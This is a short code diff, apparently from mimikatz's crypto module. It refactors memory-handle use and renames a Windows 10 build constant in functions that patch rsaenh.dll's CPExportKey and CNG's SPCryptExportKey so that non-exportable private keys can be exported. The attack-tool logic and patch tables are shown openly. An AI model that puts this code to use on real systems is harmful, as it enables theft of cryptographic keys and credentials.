@@ -911,13 +911,12 @@ KULL_M_PATCH_GENERIC Capi4000References[] = {
 #endif
 NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 {
-	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleRsaEnh;
 	KULL_M_MEMORY_ADDRESS
-		aPattern4000Memory = {NULL, &hLocalMemory},
-		aPattern4001Memory = {NULL, &hLocalMemory},
-		aPatchMemory = {NULL, &hLocalMemory};
-	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &hLocalMemory}, 0}, NULL};
+		aPattern4000Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aPattern4001Memory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE},
+		aPatchMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
+	KULL_M_MEMORY_SEARCH sMemory = {{{K_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000;
 	
 	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
@@ -928,7 +927,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		aPattern4000Memory.address = currentReference4000->Search.Pattern;
 		aPatchMemory.address = currentReference4001->Patch.Pattern;
 
-		if(kull_m_process_getVeryBasicModuleInformationsForName(&hLocalMemory, L"rsaenh.dll", &iModuleRsaEnh))
+		if(kull_m_process_getVeryBasicModuleInformationsForName(&KULL_M_MEMORY_GLOBAL_OWN_HANDLE, L"rsaenh.dll", &iModuleRsaEnh))
 		{
 			sMemory.kull_m_memoryRange.size = iModuleRsaEnh.SizeOfImage - ((PBYTE) K_CPExportKey - (PBYTE) iModuleRsaEnh.DllBase.address);
 		
@@ -964,7 +963,7 @@ KULL_M_PATCH_GENERIC CngReferences[] = {
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+	{KULL_M_WIN_BUILD_10_1507,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
 };
 #endif
 NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
